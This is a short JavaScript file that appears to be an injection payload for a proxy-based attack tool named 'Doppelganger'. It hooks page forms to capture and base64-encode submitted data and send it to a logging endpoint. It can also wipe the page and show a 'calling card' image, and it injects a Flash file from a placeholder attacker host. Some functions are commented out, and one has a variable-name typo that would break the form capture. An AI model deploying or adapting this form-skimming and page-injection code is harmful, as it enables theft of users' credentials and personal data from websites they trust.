var httpServer="http://proxyIpAddr:httpPort";
var $jDoppelganger = ""

$jDoppelganger = jQuery.noConflict();

function initialize_doppelganger()
{
	//display_calling_card();
	//form_steal();
	flash_inject();
	//alert("Doppelganger running!");
}

function display_calling_card()
{
	var calling_card = httpServer + "/images/calling_card.jpg";
	
	var img = $jDoppelganger(document.createElement("img"));
	img.attr('src', calling_card);

	$jDoppelganger("body").empty();
	img.appendTo("body");
}

function steal_form_data(form)
{
	//var encoded_form_data = Base64.encode($jDoppelganger(form).serialize());
	var encoded_from_data = $.base64Encode($jDoppelganger(form).serialize());

	var url = "/doppelganger-log?formdata=" + encoded_form_data.substring(0, encoded_form_data.length - 2);
	$jDoppelganger.get(url);
}

function form_steal()
{
	$jDoppelganger('form').bind('submit', function(e) { steal_form_data(this); });
}

function flash_inject()
{
	$jDoppelganger("body").flashembed(httpServer + "/flash/demo.swf");
	//var flash_applet = httpServer + "/flash/flash.swf";		
}

function break_fixit()
{
}

$jDoppelganger(document).ready(function() { initialize_doppelganger(); });
